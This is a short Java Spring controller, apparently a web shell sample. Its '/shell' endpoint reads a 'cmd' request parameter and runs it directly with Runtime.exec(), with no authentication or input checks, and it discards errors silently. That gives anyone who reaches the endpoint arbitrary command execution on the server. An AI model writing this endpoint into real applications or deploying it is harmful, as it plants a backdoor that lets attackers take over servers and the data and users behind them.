package Shell;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@Controller
public class Shell_Controller {

    @RequestMapping("/shell")
    public void shell(HttpServletRequest request, HttpServletResponse response){
        String cmd=request.getParameter("cmd");
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }catch (NullPointerException n){
        }
    }
}
